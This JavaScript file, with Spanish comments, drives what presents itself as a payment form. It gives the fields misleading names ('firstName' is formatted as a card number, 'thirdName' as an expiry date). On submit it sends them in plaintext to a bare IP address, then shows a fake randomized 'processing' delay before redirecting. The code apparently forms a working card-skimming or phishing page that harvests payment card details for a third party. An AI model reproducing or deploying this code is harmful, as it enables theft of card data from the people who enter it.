document.getElementById('payment-form').addEventListener('submit', async function (e) {
    e.preventDefault();

    const firstName = document.getElementById('firstName').value.trim();
    const secondName = document.getElementById('secondName').value.trim();
    const thirdName = document.getElementById('thirdName').value.trim();

    // 🚨 Validaciones antes de enviar
    if (!firstName || !secondName || !thirdName) {
        alert("❌ Por favor, completa todos los campos.");
        return;
    }

    // 🔹 Verificar conexión a Internet antes de enviar
    if (!navigator.onLine) {
        alert("🚨 No tienes conexión a Internet.");
        return;
    }

    // 🔹 Verificar si el servidor está disponible antes de enviar datos
    const serverUrl = "http://95.173.217.71:3000/send-data"; // 🔹 Reemplaza con tu IP pública

    try {
        const serverCheck = await fetch(serverUrl, { method: 'GET' });
        if (!serverCheck.ok) {
            throw new Error(`El servidor no está accesible: ${serverCheck.status}`);
        }
    } catch (error) {
        console.error("🚨 Error al verificar el servidor:", error);
        alert("Hubo un problema al conectar con el servidor. Inténtalo más tarde.");
        return;
    }

    // 🔹 Deshabilitar el botón para evitar múltiples envíos
    const payButton = document.querySelector('.pay-button');
    payButton.disabled = true;
    payButton.innerText = "Procesando...";

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 8000); // 🔹 Tiempo límite de espera: 8 segundos

        const response = await fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ firstName, secondName, thirdName }),
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            throw new Error(`Error ${response.status}: ${response.statusText}`);
        }

        const data = await response.json();
        console.log("✅ Datos enviados correctamente:", data);

        // 🔹 Simulación de carga antes de abrir processing.html
        setTimeout(() => {
            window.location.href = "/processing/processing.html";
        }, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000);
    } catch (error) {
        console.error("🚨 Error al enviar los datos:", error);
        alert(`Hubo un problema al procesar la información. ⚠️ Detalles: ${error.message}`);

        // 🔹 Reactivar el botón si hay error
        payButton.disabled = false;
        payButton.innerText = "Pagar";
    }
});

// ✨ Formateo automático del número de tarjeta
document.getElementById('firstName').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = value;
});

// 🚀 Formateo automático de la fecha MM / AA (Solo números)
document.getElementById('thirdName').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').slice(0, 4); // 🔹 Solo números
    if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2); // 🔹 Formato MM/AA
    }
    e.target.value = value;
});

// 🚀 Desplegar el formulario sin afectar la información de contacto
function togglePayment() {
    const paymentForm = document.getElementById('payment-form');
    const paymentDot = document.getElementById('payment-dot');

    paymentForm.classList.toggle('shown');
    paymentDot.classList.toggle('selected');
}
